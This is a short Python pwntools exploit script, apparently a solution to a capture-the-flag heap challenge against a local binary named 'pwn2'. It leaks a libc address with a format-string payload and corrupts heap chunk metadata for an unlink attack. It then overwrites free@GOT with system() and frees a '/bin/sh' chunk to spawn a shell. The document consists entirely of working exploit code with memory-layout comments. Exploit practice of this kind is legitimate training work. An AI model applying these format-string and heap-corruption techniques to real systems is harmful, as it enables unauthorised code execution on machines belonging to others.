from pwn import *
import string

#io = process('./pwn6')
io = process('./pwn2')

gdb.attach(pidof('pwn2')[-1])


io.recvuntil('your name!')
#io.send('%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x\n')
#for i in range(0,18):
	#io.recvuntil('-')
#leak = io.recvuntil(' ')
input1 = '|%19$x|'
io.sendline(input1)
recv1 = io.recvuntil('!')
leak = string.atoi(recv1.split('|')[1],16)
print '[*]leak =  '+ hex(leak)

#get libc_addr
libc_addr =leak - 0x19a63
print hex(libc_addr)

#get system_addr
elf = ELF("/lib32/libc-2.19.so")
system_offset = elf.symbols['system']
system_addr = libc_addr + system_offset
print '[*]system_addr = '+ hex(system_addr)

#chunk 1
io.send('1\n')
#chunk 2
io.send('2\n')
#chunk 3
io.send('2\n')
#edit chunk 3
io.send('3\n')
io.send('3\n')
io.send('/bin/sh\n')
#edit chunk 1
io.send('3\n')
io.send('1\n')
io.send('\x00\x00\x00\x00'+ '\x79\x00\x00\x00'+'\x94\xa0\x04\x08'+'\x98\xa0\x04\x08'+'A'*104+'\x78\x00\x00\x00'+'\n')
#0804b000 |     0    |  0x81    |  0      |0x79
#0804b010 |0x0804a094|0x0804a098|
#...
#0804b080 |0x00000078|0x100
#delete chunk 2
io.send('4\n')
io.send('2\n')
#edit chunk 1...0x0804a094
io.send('3\n')
io.send('1\n')
io.send('A'*12 + '\x14\xa0\x04\x08'+'\n')
#edit chunk 1...free@got
io.send('3\n')
io.send('1\n')
io.sendline(p32(system_addr))
#delete chunk 3...free(3) = system('/bin/sh')
io.send('4\n')
io.send('3\n')
io.interactive()
